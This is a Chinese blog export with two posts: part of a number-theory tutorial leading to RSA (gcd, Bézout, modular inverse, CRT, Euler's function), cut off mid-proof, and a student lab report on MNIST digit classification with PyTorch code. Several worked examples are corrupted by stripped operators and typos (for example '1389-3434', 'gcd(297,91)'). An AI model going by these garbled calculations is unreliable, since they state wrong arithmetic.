m&#x3D;b$, 则 $a\\equiv b(\\bmod m)$. 但他们本质上是两个不同的概念.$a\\bmod m&#x3D;b$ 表达的是一个函数, 而 $a\\equiv b(\\bmod m)$ 表达的是两个整数之间的关系. 另外，同余式$a\\equiv b(\\bmod m)$还可以表示为$m|(b-a)$，同时符合上式的式子可以转化为同余式 模算术的性质： 定理3：如果m是正整数，a,b是整数，则有$$\\begin{aligned}(a+b)\\bmod m &amp;&#x3D;((a\\bmod m)+(b\\bmod m))\\bmod m\\ab\\bmod m &amp;&#x3D;(a\\bmod m)(b\\bmod m)\\bmod m\\end{aligned}$$根据定理3，可得一下推论 推论1：设m是正整数，a,b,c是整数；如果$a\\equiv b(\\bmod m)$则$ac\\equiv bc(\\bmod m)$ 证明： $\\because a\\equiv b(\\bmod m)$ $\\therefore m|(b-a)$ 所以右端再乘以任何整数m都可以整除 即$m|(b-a)c$ 同理，既然$m|(b-a)$且$c|c$ 也可以推出$mc|(b-a)c$ 结论：若$a\\equiv b(\\bmod m)$，则$ac\\equiv bc(\\bmod m)$且$ac\\equiv bc(\\bmod mc)$同时成立 推论2设 m 是正整数, a, b 是整数, c 是不能被 m 整除的整数; 如果 $ac\\equiv bc(\\bmod m)$, 则$a\\equiv b(\\bmod m)$,依据推论1的证明，也是显而易见的。 3.最大公约数如果一个整数 d 能够整除另一个整数 a, 则称 d 是 a 的一个约数(divisor); 如果 d 既能整除 a 又能整除 b, 则称 d 是 a 和 b 的一个公约数(common divisor). 能整除两个整数的最大整数称为这两个整数的最大公约数(greatest common divisor). 定义2：令a和b是不全为0的两个整数，能使$d|a$和$d|b$的最大整数d成为a和b的最大公约数，记作$gcd(a,b)$ 3.1 求最大公约数如何求两个已知整数的最大公约数呢? 这里我们讨论一个高效的求最大公约数的算法, 称为辗转相除法. 因为这个算法是欧几里得发明的, 所以也称为欧几里得算法. 辗转相除法基于以下定理: 引理 1 令 $a&#x3D;bq+r$, 其中 a, b, q 和 r 均为整数. 则有$gcd(a,b)&#x3D;gcd(b,r)$ 证明：我们假设 d 是 a 和 b 的公约数, 即 $d|a$且 $d|b$, 那么根据定理2, d 也能整除 $a-bq&#x3D;r$. 所以 a 和 b 的任何公约数也是 b 和 r 的公约数; 类似地, 假设 d 是 b 和 r 的公约数, 即 $d|b$且 $d|r$, 那么根据定理2, d 也能整除 $a&#x3D;bq+r$.. 所以 b 和 r 的任何公约数也是 a 和 b 的公约数; 因此, a 与 b 和 b 与 r 拥有相同的公约数. 所以 $gcd(a,b)&#x3D;gcd(b,r)$ 辗转相除法就是利用引理1, 把大数转换成小数. 例如, 求 $gcd(287,91)$, 我们就把用较大的数除以较小的数. 首先用 287 除以 91, 得$$287&#x3D;91\\cdot3+14$$我们有$gcd(287,91)&#x3D;gcd(91,14)$,问题转化成求$gcd(91,14)$,同样的，用91除以14得$$91&#x3D;14\\cdot6+7$$有$gcd(91,14)&#x3D;gcd(14,7)$,用14除以7得$$14&#x3D;7\\cdot2+0$$所以$gcd(297,91)&#x3D;gcd(91,14)&#x3D;gcd(14,7)&#x3D;7$ 代码是这样的(两个都可以) 12345678910def gcd(a,b): while b!=0 : r = a%b a = b b = r return adef gcd_new(a,b): if b==0: return a return gcd_new(b,a%b) 3.2 贝祖定理现在我们讨论最大公约数的一个重要性质: 定理 4 贝祖定理 如果整数 a, b 不全为零, 则 $gcd(a,b)$是 a 和 b 的线性组合集$ax+by|x,y\\in Z$ 中最小的元素. 这里的 x 和 y 被称为贝祖系数 证明 令 $A&#x3D;ax+by|x,y\\in Z$ 设存在 $x_0$ ,$y_0$ 使 $d_0$ 是 A 中的最小正元素, $d_0&#x3D;ax_0+by_0$; 现在用 $d_0$去除 a, 这就得到唯一的整数 q(商) 和 r(余数) 满足$$\\begin{aligned}d_0q+r &amp;&#x3D; a \\qquad 0\\leq r&lt;d_0\\(ax_0+by_0)q+r&amp;&#x3D;a\\r&amp;&#x3D;a-aqx_0-bqy_0\\r&amp;&#x3D;a(1-qx_0)+b(-qy_0)\\in A\\end{aligned}$$又$0\\leq r &lt;d_0$,$d_0$是A中最小的正元素 $\\therefore r&#x3D;0,d|a$ 同理, 用 $d_0$去除 b, 可得 $d_0|b$. 所以说 $d_0$ 是 a 和 b 的公约数. 设 a 和 b 的最大公约数是 d, 那么$d|(ax_0+by_0)$即 $d|d_0$ $\\therefore d_0$是a和b的最大公约数 我们可以对辗转相除法稍作修改, 让它在计算出最大公约数的同时计算出贝祖系数. 1234def gcd_new_2(a,b): if b==0: return a,1,0 d,x,y = gcd_new_2(b,a%b) return d,y,x-(int(a/b))*y 大家是否还记得辗转相除法：我们换一个步骤多一点的例子$gcd(963,657)$$$\\begin{aligned}963&amp;&#x3D;1\\cdot657+306 \\qquad\\qquad&amp;9&amp;&#x3D;7\\cdot657-15\\cdot(963-657)&#x3D;22\\cdot657-15\\cdot963 \\657&amp;&#x3D;2\\cdot306+45 &amp;9&amp;&#x3D;7\\cdot(657-2\\cdot306)-306&#x3D;7\\cdot657-15\\cdot963 \\306&amp;&#x3D;6\\cdot45+36 &amp;9&amp;&#x3D;45-(306-6\\cdot45)&#x3D;7\\cdot45-306\\45 &amp;&#x3D;1\\cdot36+9 &amp;9&amp;&#x3D;45-36\\36 &amp;&#x3D;4\\cdot9\\end{aligned}$$ $gcd(963,657)&#x3D;9&#x3D;22\\cdot657-15\\cdot963,x_0&#x3D;-15,y_0&#x3D;22$就是二元一次方程$963x+657y&#x3D;9$的一组解且是$963x+657y$方程的正整数中的最小解。 4.线性同余方程现在我们来讨论求解形如 $ax\\equiv b(\\bmod m)$ 的线性同余方程. 求解这样的线性同余方程是数论研究及其应用中的一项基本任务. 如何求解这样的方程呢? 我们要介绍的一个方法是通过求使得方程 $\\overline{a}a\\equiv 1(\\bmod m)$ 成立的整数 $\\overline{a}$. 我们称 $\\overline{a}$为 a 模 m 的逆. 下面的定理指出, 当 a 和 m 互素时, a 模 m 的逆必然存在. 定理5：如果 a 和 m 为互素的整数且 $m&gt;1$, 则 a 模 m 的逆存在, 并且是唯一的. 证明 由贝祖定理可知, $\\because gcd(a,m)&#x3D;1$ , ∴ 存在整数 x 和 y 使得$$ax+my&#x3D;1$$这蕴含着$$ax+my\\equiv 1(\\bmod m)\\\\because my\\equiv0(\\bmod m)，所以有\\ax\\equiv 1(\\bmod m)\\\\therefore x为a模的逆$$这样我们就可以调用辗转相除法 gcd(a, m) 求得 a 模 m 的逆. 求得了 a 模 m 的逆 �¯, 现在我们可以来解线性同余方程了. 具体的做法是这样的: 对于方程$ax\\equiv b( \\bmod m)$同时乘以$\\overline{a}$得,$$\\overline{a}ax\\equiv \\overline{a}b(\\bmod m)$$$把\\overline{a}a\\equiv 1(\\bmod m )代入上式，得\\$$$x\\equiv \\overline{a}b(\\bmod m)$$ $x\\equiv \\overline{a}b(\\bmod m)$就是方程的解，注意同余方程会有无数个W整数解, 所以我们用同余式来表示同余方程的解. 例1:求$34x\\equiv 77(\\bmod 89)$ 解调用$gcd(34,89)$,得$gcd(34,89)&#x3D;1&#x3D;1389-3434$,所以34模89的逆为-34，方程两边同时乘 -34 得$$\\begin{aligned}-34\\cdot34x&amp;\\equiv-34\\cdot77(\\bmod89)\\x&amp;\\equiv-34\\cdot77(\\bmod89)\\x&amp;\\equiv-2618\\equiv52(\\bmod89)\\end{aligned}$$ 5.中国剩余定理中国南北朝时期数学著作 孙子算经 中提出了这样一个问题: 有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？ 用现代的数学语言表述就是: 下列同余方程组的解释多少?$$\\begin{cases}x\\equiv2(\\bmod3)\\x\\equiv3(\\bmod5)\\x\\equiv2(\\bmod7)\\\\end{cases}$$孙子算经 中首次提到了同余方程组问题及其具体解法. 因此中国剩余定理称为孙子定理. 定理 6 中国余数定理 令 $m_1,m_2,…..,m_n$为大于 1 且两两互素的正整数, $a_1,a_2,….a_n$ 是任意整数. 则同余方程组$$\\begin{cases}x\\equiv a_1(\\bmod m_1)\\x\\equiv a_2(\\bmod m_2)\\…..\\x\\equiv a_n(\\bmod m_n)\\\\end{cases}$$有唯一的模$m&#x3D;m_1m_2….m_n$的解 证明：我们使用构造证明法, 构造出这个方程组的解. 首先对于 $i&#x3D;1,2,….,n$, 令$$M_i&#x3D;\\frac{m}{m_i}$$ 即,$M_i$ 是除了$m_i$ 之外所有模数的积.$\\because m_1,m_2….m_n$两两互素, $\\therefore gcd(m_i,M_i)&#x3D;1$ 由定理5 可知, 存在整数 $y_i$ 是 $M_i$模$m_i$的逆. 即$$M_iy_i\\equiv1(\\bmod m_i)$$同时乘以$a_i$得$$a_iM_iy_i\\equiv a_i(\\bmod m_i)$$就是第 i 个方程的一个解; 那么怎么构造出方程组的解呢? 我们注意到, 根据 $M_i$ 的定义可得, 对所有的 $j\\neq i$, 都有 $a_iM_iy_i\\equiv0(\\bmod m_j)$. 因此我们令$$x&#x3D;a_1M_1y_1+a_2M_2y_2+….+a_nM_ny_n&#x3D;\\sum_{i&#x3D;1}^{n}{a_iM_iy_i}$$有了这个结论, 我们可以解答 孙子算经 中的问题了: 对方程组的每个方程, 求出 $M_i$ , 然后调用 gcd(M_i, m_i) 求出 $y_i$:$$\\begin{cases}\\begin{aligned}&amp;x\\equiv2(\\bmod3)\\quad &amp;M_1&amp;&#x3D;35\\quad y_1&#x3D;-1\\&amp;x\\equiv3(\\bmod5)\\quad &amp;M_2&amp;&#x3D;21\\quad y_2&#x3D;1\\&amp;x\\equiv2(\\bmod7)\\quad &amp;M_3&amp;&#x3D;15\\quad y_3&#x3D;-1\\\\end{aligned}\\end{cases}$$最后求出$x&#x3D;-235+321+2*15&#x3D;23\\equiv23(\\bmod 105)$ 6.费马小定理现在我们来看数论中另外一个重要的定理, 费马小定理(Fermat’s little theorem) 定理7费马小定理：如果a是一个整数，p是一个素数，那么$$a^p\\equiv a(\\bmod p)$$特别的当a不是p的倍数时（即$gcd(a,p)&#x3D;1$），有$$a^{p-1}\\equiv1(\\bmod p)\\$$ 7欧拉函数再来看一看欧拉函数的知识。对于正整数n，欧拉函数$\\varphi(n)$是小于或等于n的正整数中与n互质的数的数目 如$\\varphi(8)&#x3D;4$，1,3,5,7均与8互质 定理8：n,m为整数,$(n,m)&#x3D;1$，如果$a_1,a_2,….a_n$和$b_1,b_2,….b_n$分别是模n,m的一个完整系，则有形如$nb_i+ma_j(1\\leq i\\leq s,1\\leq j\\leq t)$的数构成模mn的一个完整缩系，特别地有$\\varphi(nm)&#x3D;\\varphi(n)\\varphi(m)$ 定理9：当n$\\geq2$时，设$n&#x3D;p_1^{e_1}….p_s^{e_s}$是n的标准分解式，则$$\\varphi(n)&#x3D;\\prod_{l&#x3D;1}^{s}(p_l^{e_l}-p_l^{e_l-1})&#x3D;n\\prod_{l&#x3D;1}^{s}(1-\\frac{1}{p})$$证明：当$(n.m)&#x3D;1$时$$\\varphi(n,m)&#x3D;\\varphi(n)\\varphi(m)$$当$n_1,n_2……n_s$两两互素时$$\\varphi(\\prod_{l&#x3D;1}^{s}n_l)&#x3D;\\prod_{l&#x3D;1}^{s}n_l$$因此$$\\varphi(n)&#x3D;\\prod_{l&#x3D;1}^{s}\\varphi(p_l^{e_l})$$问题转化成如何求$\\varphi(p_l^{e_l})$,其中$p_l$要么$p_l|a$,要么$(p_l,a)&#x3D;1$。在1,2….$p_l$当中可以被$p_l$整除的整数共有$\\frac{p_l^{e_l}}{p_l}&#x3D;p_l^{e_l-1}$个，故其中与$p_l^{e_l}$互素的个数共有$p_l^{e_l}-p_l^{e_l-1}$个，于是$$\\varphi(p_l^{e_l})&#x3D;p_l^{e_l}-p_l^{e_l-1}$$这样一来$$\\varphi(n)&#x3D;\\prod_{l&#x3D;1}^{s}(p_l^{e_l}-p_l^{e_l-1})&#x3D;\\prod_{l&#x3D;1}^{s}p_l^{e_l}(1-\\frac{1}{p_l})&#x3D;n\\prod_{l&#x3D;1}^{s}(1-\\frac{1}{p})$$其中若p为素数，则$$\\varphi(p)&#x3D;p-1&#x3D;p(1-\\frac{1}{p})$$ 8.RSA算法我们终于可以来看 RSA 算法了. 先来看 RSA 算法是怎么运作的: RSA 算法按照以下过程创建公钥和私钥: 1.随机算取两个大素数p和q，$p\\neq q$ 2.计算$n&#x3D;pq$ 3.选取一个与$(p-1)(q-1)$互素的小整数e 4.求e模$(p-1)(q-1)$的逆，记作d，即$de\\equiv 1\\bmod(p-1)(q-1)$ 5.将$P&#x3D;(e,n)$公开，是公钥。 6.将$S&#x3D;(d,n)$保密，作为私钥 想 要把明文$M $加密成密文$C$,计算$$C&#x3D;M^e\\bmod n$$要把密文解密成明文$C$$M $,计算$$M&#x3D;C^d \\bmod n$$ 下面证明RSA算法是有效的： 证明：要证明其有效性，只需要证明$C\\equiv M^e\\bmod n$也就是$M^{ed}\\equiv M(\\bmod n)$,注意到d为e模$(p-1)(1-1)$的逆，所以有$$ed\\equiv 1(\\bmod(p-1)(q-1))$$ 。","categories":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://snowman12137.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"现代密码学","slug":"现代密码学","permalink":"https://snowman12137.github.io/tags/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"author":"Sn0wma1n"},{"title":"大三网络安全人工智能实验报告","slug":"大三网络安全人工智能实验报告","date":"2023-05-04T12:09:16.000Z","updated":"2024-02-03T17:05:00.554Z","comments":true,"path":"2023/05/04/大三网络安全人工智能实验报告/","link":"","permalink":"https://snowman12137.github.io/2023/05/04/%E5%A4%A7%E4%B8%89%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/","excerpt":"","text":"《人工智能》课程实验报告网络与信息安全学院班 级： 20180XX 姓 名： XXX 学 号： 20009XXXX 提交时间： 2023. 4. 20 基于神经网络的MNIST手写数字识别一、实验目的 掌握运用神经网络模型解决有监督学习问题 掌握机器学习中常用的模型训练测试方法 了解不同训练方法的选择对测试结果的影响 二、实验内容MNIST数据集​ 本实验采用的数据集MNIST是一个手写数字图片数据集，共包含图像和对应的标签。数据集中所有图片都是28x28像素大小，且所有的图像都经过了适当的处理使得数字位于图片的中心位置。MNIST数据集使用二进制方式存储。图片数据中每个图片为一个长度为784（28x28x1，即长宽28像素的单通道灰度图）的一维向量，而标签数据中每个标签均为长度为10的一维向量。 分层采样方法​ 分层采样（或分层抽样，也叫类型抽样）方法，是将总体样本分成多个类别，再分别在每个类别中进行采样的方法。通过划分类别，采样出的样本的类型分布和总体样本相似，并且更具有代表性。在本实验中，MNIST数据集为手写数字集，有0~9共10种数字，进行分层采样时先将数据集按数字分为10类，再按同样的方式分别进行采样。 神经网络模型评估方法​ 通常，我们可以通过实验测试来对神经网络模型的误差进行评估。为此，需要使用一个测试集来测试模型对新样本的判别能力，然后以此测试集上的测试误差作为误差的近似值。两种常见的划分训练集和测试集的方法： ​ 留出法（hold-out）直接将数据集按比例划分为两个互斥的集合。划分时为尽可能保持数据分布的一致性，可以采用分层采样（stratified sampling）的方式，使得训练集和测试集中的类别比例尽可能相似。需要注意的是，测试集在整个数据集上的分布如果不够均匀还可能引入额外的偏差，所以单次使用留出法得到的估计结果往往不够稳定可靠。在使用留出法时，一般要采用若干次随机划分、重复进行实验评估后取平均值作为留出法的评估结果。 ​ k折交叉验证法（k-fold cross validation）先将数据集划分为k个大小相似的互斥子集，每个子集都尽可能保持数据分布的一致性，即也采用分层采样（stratified sampling）的方法。然后，每次用k-1个子集的并集作为训练集，余下的那个子集作为测试集，这样就可以获得k组训练集和测试集，从而可以进行k次训练和测试。最终返回的是这k个测试结果的均值。显然，k折交叉验证法的评估结果的稳定性和保真性在很大程度上取决于k的取值。k最常用的取值是10，此外常用的取值还有5、20等。 三、实验方法设计 实验环境 1.VSCODE 2.anaconda&#x3D;&#x3D;4.14.0 3.python&#x3D;&#x3D;3.7 4.TensorFlow–gpu&#x3D;&#x3D;1.15.0 5.Keras&#x3D;&#x3D;2.3.1 6.实验报告编辑器：typora 介绍实验中程序的总体设计方案、关键步骤的编程方法及思路，主要包括: 因为之前用过pytorch进行机器学习的训练和学习，所以本作业使用pytorch进行建模和训练。 标准训练流程如下：导入包-&gt;设定初始值-&gt;加载数据集（预处理）-&gt;建立模型-&gt;训练-&gt;测试-&gt;评估 其中需要对加载数据集进行处理，把留出法的比例进行调整来观察结果。 其次要使用k折交叉验证法进行对比测试。 为了表明k折交叉验证法与留出法的效果对比，我建立了连个模型，一个是按照标准流程建立的优秀的模型。一个是用作对比k折交叉验证法与留出法效果对比的劣质模型。 含有tensorflow部分代码，在四、4中。 设置初始值 123456&gt;mean = [0.5]&gt;std = [0.5]&gt;# batch size&gt;BATCH_SIZE =128&gt;Iterations = 1 # epoch&gt;learning_rate = 0.01 优化器与损失函数 12&gt;criterion = torch.nn.CrossEntropyLoss() &gt;optimizer = torch.optim.SGD(model.parameters(),learning_rate) 训练代码 12345678910111213&gt;def train(model, optimizer,criterion,epoch): model.train() # setting up for training for batch_idx, (data, target) in enumerate(train_loader): # data contains the image and target contains the label = 0/1/2/3/4/5/6/7/8/9 data = data.view(-1, 28*28).requires_grad_() optimizer.zero_grad() # setting gradient to zero output = model(data) # forward loss = criterion(output, target) # loss computation loss.backward() # back propagation here pytorch will take care of it optimizer.step() # updating the weight values if batch_idx % 100 == 0: print(&#x27;Train Epoch: &#123;&#125; [&#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)]\\tLoss: &#123;:.6f&#125;&#x27;.format( epoch, batch_idx * len(data), len(train_loader.dataset), 100. * batch_idx / len(train_loader), loss.item())) 测试代码 1234567891011121314151617181920212223&gt;def test(model, criterion, val_loader, epoch,train= False): model.eval() test_loss = 0 correct = 0 with torch.no_grad(): for batch_idx, (data, target) in enumerate(val_loader): data = data.view(-1, 28*28).requires_grad_() output = model(data) test_loss += criterion(output, target).item() # sum up batch loss pred = output.max(1, keepdim=True)[1] # get the index of the max log-probability correct += pred.eq(target.view_as(pred)).sum().item() # if pred == target then correct +=1 test_loss /= len(val_loader.dataset) # average test loss if train == False: print(&#x27;\\nTest set: Average loss: &#123;:.4f&#125;, Accuracy: &#123;&#125;/&#123;&#125; (&#123;:.4f&#125;%)\\n&#x27;.format( test_loss, correct, val_loader.sampler.__len__(), 100. * correct / val_loader.sampler.__len__() )) if train == True: print(&#x27;\\nTrain set: Average loss: &#123;:.4f&#125;, Accuracy: &#123;&#125;/&#123;&#125; (&#123;:.4f&#125;%)\\n&#x27;.format( test_loss, correct, val_loader.sampler.__len__(), 100. * correct / val_loader.sampler.__len__() )) return 100. * correct / val_loader.sampler.__len__() 1）模型构建的程序设计（伪代码或源代码截图）及说明解释 （10分）训练模型 12345678910111213141516class Net(nn.Module): def __init__(self): super(Net, self).__init__() self.conv = nn.Conv2d(1, 32, 3) self.dropout = nn.Dropout2d(0.25) self.fc = nn.Linear(5408, 10) def forward(self, x): x = self.conv(x) x = F.relu(x) x = F.max_pool2d(x, 2) x = self.dropout(x) x = torch.flatten(x, 1) x = self.fc(x) output = F.log_softmax(x, dim=1) return output 我用了一层conv和一层pool来获取cherng图片的特征。之后把这些特征减小为10个层，所以用flatten把特征集中成vector后，再用一个全连接层连接到输出层。 使用留出法原始的训练比例，两个Epoch，得到的结果很好。达到97%。 为了对比留出法及K折验证法建立的简陋模型 1model = nn.Sequential(nn.Flatten(), nn.Linear(784, 256), nn.ReLU(),nn.Linear(256, 10)) 可以看到这个简陋模型得到的结果很差，准确率只有83%，用于之后的K折校验法的对比组。预处理和上述相同，Epoch只有一组。 2）模型迭代训练的程序设计（伪代码或源代码截图）及说明解释 （10分）123456789101112131415def train(model, optimizer,criterion,epoch): model.train() # setting up for training for batch_idx, (data, target) in enumerate(train_loader): data = data.view(-1, 28*28).requires_grad_() optimizer.zero_grad() # setting gradient to zero output = model(data) # forward loss = criterion(output, target) # loss computation loss.backward() # back propagation here pytorch will take care of it optimizer.step() # updating the weight values if batch_idx % 100 == 0: print(&#x27;Train Epoch: &#123;&#125; [&#123;&#125;/&#123;&#125; (&#123;:.0f&#125;%)]\\tLoss: &#123;:.6f&#125;&#x27;.format( epoch, batch_idx * len(data), len(train_loader.dataset), 100. * batch_idx / len(train_loader), loss.item())) 先注意到因為 training 和 testing 時 model 會有不同行為，所以用 model.train() 把 model 調成 training 模式。 接著 iterate 過 batch_idx，每個 batch_idx會 train 過整個 training set。每個 dataset 會做 batch training。 接下來就是重點了。基本的步驟：zero_grad、model(data)、取 loss、back propagation 算 gradient、最後 update parameter。前面都介紹過了，還不熟的可以往前翻。 3）模型训练过程中周期性测试的程序设计（伪代码或源代码截图）及说明解释（周期性测试指的是每训练n个step就对模型进行一次测试，得到准确率和loss值）（10分） 我选用了每100步进行一个打印的频率，打印训练进度和Loss值，最后打印平均损失值和准确率。 4）分层采样的程序设计（伪代码或源代码截图）及说明解释 （10分）12345678910111213141516171819train_transform = transforms.Compose([ transforms.ToTensor(), transforms.Normalize(mean, std) ]) test_transform = transforms.Compose([ transforms.ToTensor(), transforms.Normalize(mean, std) ]) train_loader = torch.utils.data.DataLoader( datasets.MNIST(&#x27;./mnist&#x27;, train=True, download=True, transform=train_transform), batch_size=BATCH_SIZE, shuffle=True) # train dataset test_loader = torch.utils.data.DataLoader( datasets.MNIST(&#x27;./mnist&#x27;, train=False, transform=test_transform), batch_size=BATCH_SIZE, shuffle=False) # test dataset 123456789&gt;def hold_out(images, labels, train_percentage): test_acc = torch.zeros([Iterations]) train_acc = torch.zeros([Iterations]) ## training the logistic model for i in range(Iterations): train(model, optimizer,criterion,i) train_acc[i] = test(model, criterion, train_loader, i,train=True) #Testing the the current CNN test_acc[i] = test(model, criterion, test_loader, i) torch.save(model,&#x27;perceptron.pt&#x27;) 使用了系统自带的minist数据分类器。 5）k折交叉验证法的程序设计（伪代码或源代码截图）及说明解释 （10分） mnist数据集的训练集和测试集的合并 123456789train_init = datasets.MNIST(&#x27;./mnist&#x27;, train=True, transform=train_transform) test_init = datasets.MNIST(&#x27;./mnist&#x27;, train=False, transform=test_transform) # the dataset for k fold cross validation dataFold = torch.utils.data.ConcatDataset([train_init, test_init]) 使用Sklearn中的KFold进行数据集划分，并且转换回pytorch类型的Dataloader 123456789kf = KFold(n_splits=k_split_value,shuffle=True, random_state=0) # init KFold for train_index , test_index in kf.split(dataFold): # split # get train, val 根据索引划分 train_fold = torch.utils.data.dataset.Subset(dataFold, train_index) test_fold = torch.utils.data.dataset.Subset(dataFold, test_index) train_loader = torch.utils.data.DataLoader(dataset=train_fold, batch_size=BATCH_SIZE, shuffle=True) test_loader = torch.utils.data.DataLoader(dataset=test_fold, batch_size=BATCH_SIZE, shuffle=True) 完整的代码 1234567891011121314151617181920212223242526def train_flod_Mnist(k_split_value): different_k_mse = [] kf = KFold(n_splits=k_split_value,shuffle=True, random_state=0) # init KFold for train_index , test_index in kf.split(dataFold): # split # get train, val train_fold = torch.utils.data.dataset.Subset(dataFold, train_index) test_fold = torch.utils.data.dataset.Subset(dataFold, test_index) # package type of DataLoader train_loader = torch.utils.data.DataLoader(dataset=train_fold, batch_size=BATCH_SIZE, shuffle=True) test_loader = torch.utils.data.DataLoader(dataset=test_fold, batch_size=BATCH_SIZE, shuffle=True) # train model test_acc = torch.zeros([Iterations]) train_acc = torch.zeros([Iterations]) ## training the logistic model for i in range(Iterations): train(model, optimizer,criterion,i) train_acc[i] = test(model, criterion, train_loader, i,train=True) #Testing the the current CNN test_acc[i] = test(model, criterion, test_loader, i) #torch.save(model,&#x27;perceptron.pt&#x27;) # one epoch, all acc different_k_mse.append(np.array(test_acc)) return different_k_mse 按循序打印结果 123456testAcc_compare_map = &#123;&#125;for k_split_value in range(2, 10+1): print(&#x27;now k_split_value is:&#x27;, k_split_value) testAcc_compare_map[k_split_value] = train_flod_Mnist(k_split_value)for key in testAcc_compare_map:print(np.mean(testAcc_compare_map[key])) testAcc_compare_map是将不同k值下训练的结果保存起来，之后我们可以通过这个字典变量，计算出rmse ，比较不同k值下，实验结果的鲁棒性。 四、实验结果展示展示程序界面设计、运行结果及相关分析等，主要包括： 1）模型在验证集下的准确率（输出结果并截图）（10分） 下面的实验是k值为[2,10]下的结果，训练模型为简陋模型。 对照组：简陋模型，epoch为1，分层抽样（正确率只有83.79%） k折校验：简陋模型，epoch为1，K折交叉验证(K值为2到10)准确率越来越大 2）不同模型参数（隐藏层数、隐藏层节点数）对准确率的影响和分析 （10分） 本次实验中只探讨了简陋版模型与卷积模型的对比： 其中简陋版模型如下，先把图片变为一个以为张量，然后由一个全连接层链接，接入到ReLu层中，然后接入全连接层，可以看到，并没有使用卷积层，在epoch&#x3D;1的情况下只有83%的准确率。 1&gt;model = nn.Sequential(nn.Flatten(), nn.Linear(784, 256), nn.ReLU(),nn.Linear(256, 10)) 卷积模型如下，先定义卷积卷积层，输入通道为1，输出为32，核大小为3，一个Dropout2d层，以0.25的概率将通道输入置零，防止过拟合。然后是一个全连接层，输入为5408，输出为10，映射到10个分类结果。在forward中首先通过卷积层进行卷积，然后通过ReLU进行非线性变换，然后使用最大池化层进行采样，将图签尺寸缩小一半，然后用Dropout2d防止过拟合，接着把输出的张良展平为一维，并传入全连接层。 在 12345678910111213141516&gt;class Net(nn.Module): def __init__(self): super(Net, self).__init__() self.conv = nn.Conv2d(1, 32, 3) self.dropout = nn.Dropout2d(0.25) self.fc = nn.Linear(5408, 10) def forward(self, x): x = self.conv(x) x = F.relu(x) x = F.max_pool2d(x, 2) x = self.dropout(x) x = torch.flatten(x, 1) x = self.fc(x) output = F.log_softmax(x, dim=1) return output 可以看到在epoch&#x3D;1的情况下准确率达到97%，拟合效果非常好 3）不同训练参数（batch size、epoch num、学习率）对准确率的影响和分析 （10分） 注：默认值：在讨论某一变化时，其他值不变 123&gt;BATCH_SIZE =64&gt;Iterations = 1 # epoch&gt;learning_rate = 0.01 原始结果（83%） BATCH_SIZE讨论（可以发现当BATCH_SIZE越大时，准确率直线下降） 1&gt;&#123;&quot;16&quot;:&quot;90.85%&quot;,&quot;32&quot;:&quot;90.1000%&quot;,&quot;64&quot;:&quot;88.2200%&quot;,&quot;128&quot;:&quot;83.7100%&quot;,&quot;256&quot;:&quot;70.7300%&quot;,&quot;512&quot;:&quot;48.2400%&quot;&#125; epoch讨论(可以发现随着epoch的增大，准确率有较大提升，但是随着epoch越来越大，准确率增长越来越慢) 12[1,2,4,6,10,15][83.83,88.370,90.290,91.260,92.420,93.36] 学习率 可以看到，当学习率增大时，准确率有所增加，但是当学习率大于0.2时，准确率急速下滑到11%左右，也就是说，10个手写体正确率只有1个，趋于随机分布，是一个非常不好的模型，可见，学习率的选择至关重要。 12&gt;[0.01,0.02,0.05,0.1,0.2,0.5,1]&gt;[83.83,88.230,90.78,91.79,91.78,11.35,11.35] 4）留出法不同比例对结果的影响和分析 （10分） 因为pytorch中的训练集是固定输出的，对其更改较难，所以本小节使用TensorFlow进行实验： 数据集划分:其中a为训练比率，总共有70000个样本，按照比例进行训练和测试，结果如下 1234567891011121314151617181920212223&gt;np.random.seed(10)&gt;a = 0.8&gt;from keras.datasets import mnist&gt;(x_train_image,y_train_label),(x_test_image,y_test_label)=mnist.load_data()&gt;# x_all = x_train_image + x_test_image&gt;temp = np.append( x_train_image , x_test_image)&gt;x_all = temp.reshape(70000,28,28)&gt;print(len(y_train_label))&gt;y_lable = np.append(y_train_label,y_test_label)&gt;train_num = int(60000*a)&gt;x_train_image = x_all[:train_num]&gt;y_train_label = y_lable[:train_num]&gt;x_test_image = x_all[train_num:]&gt;y_test_label = y_lable[train_num:]&gt;x_Train=x_train_image.reshape(train_num,784).astype(&#x27;float32&#x27;)&gt;x_Test=x_test_image.reshape(70000-train_num,784).astype(&#x27;float32&#x27;) 12&gt;[0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9, 0.95, 0.9999]&gt;[0.9213, 0.9381, 0.9528, 0.9620, 0.9666, 0.9673, 0.9709, 0.9752, 0.9758, 0.9784, 0.9780] 可以看到随着训练样本的比率上升，总体的准确率也对应的明显的上升了，但是最后一组0.9999比率的组，较前一组0.95有所下降，这表明过大的训练比率对结果也会产生损害。 5）k折交叉验证法不同k值对结果的影响和分析 （10分） 把k值从2-10进行迭代计算，其他参数不变，结果为： 12345678&gt;testAcc_compare_map = &#123;&#125;&gt;for k_split_value in range(2, 10+1): print(&#x27;now k_split_value is:&#x27;, k_split_value) testAcc_compare_map[k_split_value] = cross_validation(k_split_value) &gt;for key in testAcc_compare_map: print(np.mean(testAcc_compare_map[key])) 可见K值对结果影响很大，且在一定范围内，越大越好。 五、实验总结及心得 本次实验熟知了pytorch和TensorFlow的使用，还有机器学习的整体流程和处理概况，解决了出现的诸多问题，尤其是在配置TensorFlow版本时出现的问题，熟知了基本的图像处理模型，以及卷积模型的基本构建。 在参数调配方面，详细了解了分层取样法，k折交叉验证法的使用以及效果还有比例的调试。还有在关键参数如batch size、epoch 